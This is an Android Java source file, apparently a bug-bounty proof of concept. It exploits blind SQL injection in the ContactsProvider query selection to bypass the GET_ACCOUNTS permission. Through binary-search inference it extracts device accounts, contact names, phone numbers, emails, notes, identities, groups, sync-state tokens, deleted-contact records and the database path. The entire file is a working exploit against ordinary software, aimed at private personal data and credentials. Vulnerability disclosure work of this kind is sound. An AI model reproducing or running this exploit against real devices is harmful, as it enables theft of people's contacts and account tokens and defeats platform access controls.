package com.vrp.poc;

import android.app.Activity;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.widget.ScrollView;
import android.widget.LinearLayout;
import android.widget.TextView;

public class FullExtractionActivity extends Activity {
    private static final String TAG = "FullExtraction";
    private static final Uri URI = Uri.parse("content://com.android.contacts/contacts");
    private TextView logView;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        ScrollView sv = new ScrollView(this);
        LinearLayout ll = new LinearLayout(this);
        ll.setOrientation(LinearLayout.VERTICAL);
        ll.setPadding(20, 20, 20, 20);
        logView = new TextView(this);
        logView.setTextSize(8);
        logView.setText("ContactsProvider Full Extraction via Blind SQLi\nUID: " + android.os.Process.myUid() + "\n\n");
        ll.addView(logView);
        sv.addView(ll);
        setContentView(sv);
        new Thread(this::runTests).start();
    }

    private void log(String msg) {
        Log.d(TAG, msg);
        runOnUiThread(() -> logView.append(msg + "\n"));
    }

    private int qc(String sel) {
        try {
            Cursor c = getContentResolver().query(URI, new String[]{"_id"}, sel, null, null);
            if (c != null) { int n = c.getCount(); c.close(); return n; }
        } catch (Exception e) { return -1; }
        return -1;
    }

    private void runTests() {
        // Step 1: Summary statistics
        log("=== STEP 1: Database Summary ===");
        int tables = en("(SELECT count(*) FROM sqlite_master WHERE type='table')");
        int contacts = en("(SELECT count(*) FROM contacts)");
        int rawContacts = en("(SELECT count(*) FROM raw_contacts)");
        int dataRows = en("(SELECT count(*) FROM data)");
        int accounts = en("(SELECT count(*) FROM accounts)");
        int groups = en("(SELECT count(*) FROM groups)");
        log("Tables: " + tables + " | Contacts: " + contacts + " | RawContacts: " +
            rawContacts + " | DataRows: " + dataRows + " | Accounts: " + accounts +
            " | Groups: " + groups);

        // Step 2: Extract all accounts (bypasses GET_ACCOUNTS)
        log("\n=== STEP 2: Account Extraction (GET_ACCOUNTS bypass) ===");
        for (int i = 0; i < accounts; i++) {
            String name = es("(SELECT account_name FROM accounts LIMIT 1 OFFSET " + i + ")", 60);
            String type = es("(SELECT account_type FROM accounts LIMIT 1 OFFSET " + i + ")", 40);
            log("Account[" + i + "]: " + name + " (" + type + ")");
        }

        // Step 3: Extract all contact names
        log("\n=== STEP 3: Contact Names ===");
        int nameCount = en("(SELECT count(*) FROM data WHERE mimetype_id=(SELECT _id FROM mimetypes WHERE mimetype='vnd.android.cursor.item/name'))");
        for (int i = 0; i < nameCount; i++) {
            String displayName = es("(SELECT data1 FROM data WHERE mimetype_id=(SELECT _id FROM mimetypes WHERE mimetype='vnd.android.cursor.item/name') LIMIT 1 OFFSET " + i + ")", 60);
            String firstName = es("(SELECT data2 FROM data WHERE mimetype_id=(SELECT _id FROM mimetypes WHERE mimetype='vnd.android.cursor.item/name') LIMIT 1 OFFSET " + i + ")", 30);
            String lastName = es("(SELECT data3 FROM data WHERE mimetype_id=(SELECT _id FROM mimetypes WHERE mimetype='vnd.android.cursor.item/name') LIMIT 1 OFFSET " + i + ")", 30);
            log("Name[" + i + "]: " + displayName + " (first=" + firstName + " last=" + lastName + ")");
        }

        // Step 4: Extract all phone numbers
        log("\n=== STEP 4: Phone Numbers ===");
        int phoneCount = en("(SELECT count(*) FROM data WHERE mimetype_id=(SELECT _id FROM mimetypes WHERE mimetype='vnd.android.cursor.item/phone_v2'))");
        for (int i = 0; i < phoneCount; i++) {
            String phone = es("(SELECT data1 FROM data WHERE mimetype_id=(SELECT _id FROM mimetypes WHERE mimetype='vnd.android.cursor.item/phone_v2') LIMIT 1 OFFSET " + i + ")", 20);
            String normalized = es("(SELECT data4 FROM data WHERE mimetype_id=(SELECT _id FROM mimetypes WHERE mimetype='vnd.android.cursor.item/phone_v2') LIMIT 1 OFFSET " + i + ")", 20);
            int rawId = en("(SELECT raw_contact_id FROM data WHERE mimetype_id=(SELECT _id FROM mimetypes WHERE mimetype='vnd.android.cursor.item/phone_v2') LIMIT 1 OFFSET " + i + ")");
            log("Phone[" + i + "]: " + phone + " (normalized=" + normalized + ") rawContact=" + rawId);
        }

        // Step 5: Extract emails
        log("\n=== STEP 5: Email Addresses ===");
        int emailCount = en("(SELECT count(*) FROM data WHERE mimetype_id=(SELECT _id FROM mimetypes WHERE mimetype='vnd.android.cursor.item/email_v2'))");
        for (int i = 0; i < emailCount; i++) {
            String email = es("(SELECT data1 FROM data WHERE mimetype_id=(SELECT _id FROM mimetypes WHERE mimetype='vnd.android.cursor.item/email_v2') LIMIT 1 OFFSET " + i + ")", 60);
            log("Email[" + i + "]: " + email);
        }

        // Step 6: Extract notes
        log("\n=== STEP 6: Contact Notes ===");
        int noteCount = en("(SELECT count(*) FROM data WHERE mimetype_id=(SELECT _id FROM mimetypes WHERE mimetype='vnd.android.cursor.item/note'))");
        for (int i = 0; i < noteCount; i++) {
            String note = es("(SELECT data1 FROM data WHERE mimetype_id=(SELECT _id FROM mimetypes WHERE mimetype='vnd.android.cursor.item/note') LIMIT 1 OFFSET " + i + ")", 100);
            log("Note[" + i + "]: " + note);
        }

        // Step 7: Extract identities (linked accounts)
        log("\n=== STEP 7: Contact Identities ===");
        int identCount = en("(SELECT count(*) FROM data WHERE mimetype_id=(SELECT _id FROM mimetypes WHERE mimetype='vnd.android.cursor.item/identity'))");
        for (int i = 0; i < identCount; i++) {
            String ident = es("(SELECT data1 FROM data WHERE mimetype_id=(SELECT _id FROM mimetypes WHERE mimetype='vnd.android.cursor.item/identity') LIMIT 1 OFFSET " + i + ")", 60);
            String namespace = es("(SELECT data2 FROM data WHERE mimetype_id=(SELECT _id FROM mimetypes WHERE mimetype='vnd.android.cursor.item/identity') LIMIT 1 OFFSET " + i + ")", 40);
            log("Identity[" + i + "]: " + ident + " ns=" + namespace);
        }

        // Step 8: Extract nicknames
        log("\n=== STEP 8: Nicknames ===");
        int nickCount = en("(SELECT count(*) FROM data WHERE mimetype_id=(SELECT _id FROM mimetypes WHERE mimetype='vnd.android.cursor.item/nickname'))");
        for (int i = 0; i < nickCount; i++) {
            String nick = es("(SELECT data1 FROM data WHERE mimetype_id=(SELECT _id FROM mimetypes WHERE mimetype='vnd.android.cursor.item/nickname') LIMIT 1 OFFSET " + i + ")", 40);
            log("Nickname[" + i + "]: " + nick);
        }

        // Step 9: Extract group names
        log("\n=== STEP 9: Groups ===");
        for (int i = 0; i < groups; i++) {
            String title = es("(SELECT title FROM groups LIMIT 1 OFFSET " + i + ")", 40);
            String acct = es("(SELECT account_name FROM groups LIMIT 1 OFFSET " + i + ")", 40);
            int memberCount = en("(SELECT count(*) FROM data WHERE mimetype_id=(SELECT _id FROM mimetypes WHERE mimetype='vnd.android.cursor.item/group_membership') AND data1=(SELECT _id FROM groups LIMIT 1 OFFSET " + i + "))");
            log("Group[" + i + "]: " + title + " (" + acct + ") members=" + memberCount);
        }

        // Step 10: Sync state & tokens
        log("\n=== STEP 10: Sync State & Tokens ===");
        int syncCount = en("(SELECT count(*) FROM _sync_state)");
        for (int i = 0; i < syncCount; i++) {
            String acctName = es("(SELECT account_name FROM _sync_state LIMIT 1 OFFSET " + i + ")", 60);
            String acctType = es("(SELECT account_type FROM _sync_state LIMIT 1 OFFSET " + i + ")", 40);
            int dataLen = en("(SELECT length(data) FROM _sync_state LIMIT 1 OFFSET " + i + ")");
            String dataStart = es("(SELECT substr(data,1,60) FROM _sync_state LIMIT 1 OFFSET " + i + ")", 60);
            log("Sync[" + i + "]: " + acctName + " (" + acctType + ") dataLen=" + dataLen);
            log("  token: " + dataStart);
        }

        // Step 11: Deleted contacts (data user believed erased)
        log("\n=== STEP 11: Deleted Contacts ===");
        int delCount = en("(SELECT count(*) FROM deleted_contacts)");
        log("Deleted contact entries: " + delCount);
        for (int i = 0; i < Math.min(delCount, 5); i++) {
            int contactId = en("(SELECT contact_id FROM deleted_contacts LIMIT 1 OFFSET " + i + ")");
            long delTime = el("(SELECT deletedTimestamp FROM deleted_contacts LIMIT 1 OFFSET " + i + ")");
            log("Deleted[" + i + "]: contactId=" + contactId + " at " + new java.util.Date(delTime));
        }

        // Step 12: Google-specific contact metadata
        log("\n=== STEP 12: Google Metadata ===");
        int miscCount = en("(SELECT count(*) FROM data WHERE mimetype_id=(SELECT _id FROM mimetypes WHERE mimetype='vnd.com.google.cursor.item/contact_misc'))");
        for (int i = 0; i < miscCount; i++) {
            String d1 = es("(SELECT data1 FROM data WHERE mimetype_id=(SELECT _id FROM mimetypes WHERE mimetype='vnd.com.google.cursor.item/contact_misc') LIMIT 1 OFFSET " + i + ")", 60);
            log("GoogleMisc[" + i + "]: " + d1);
        }

        // Step 13: Database path & SQLite version
        log("\n=== STEP 13: System Info ===");
        String sqlVer = es("(SELECT sqlite_version())", 20);
        String dbPath = es("(SELECT file FROM pragma_database_list LIMIT 1)", 120);
        log("SQLite: " + sqlVer);
        log("DB path: " + dbPath);

        log("\n=== FULL EXTRACTION COMPLETE ===");
    }

    private int en(String sub) {
        int lo = 0, hi = 100;
        while (qc(sub + " > " + hi) > 0) { hi *= 2; if (hi > 100000) return -1; }
        while (lo < hi) {
            int mid = (lo + hi) / 2;
            int r = qc(sub + " > " + mid);
            if (r > 0) lo = mid + 1; else if (r == 0) hi = mid; else return -1;
        }
        return lo;
    }

    private long el(String sub) {
        long lo = 0, hi = System.currentTimeMillis() + 86400000L;
        while (lo < hi) {
            long mid = lo + (hi - lo) / 2;
            int r = qc(sub + " > " + mid);
            if (r > 0) lo = mid + 1; else if (r == 0) hi = mid; else return -1;
        }
        return lo;
    }

    private String es(String sub, int maxLen) {
        StringBuilder result = new StringBuilder();
        for (int pos = 1; pos <= maxLen; pos++) {
            int ch = ec(sub, pos);
            if (ch <= 0) break;
            result.append((char) ch);
        }
        return result.toString();
    }

    private int ec(String sub, int pos) {
        if (qc("length(" + sub + ") >= " + pos) <= 0) return -1;
        String expr = "(SELECT unicode(substr(" + sub + "," + pos + ",1)))";
        int lo = 0, hi = 127;
        while (lo < hi) {
            int mid = (lo + hi) / 2;
            int r = qc(expr + " > " + mid);
            if (r > 0) lo = mid + 1; else if (r == 0) hi = mid; else return -1;
        }
        return lo;
    }
}
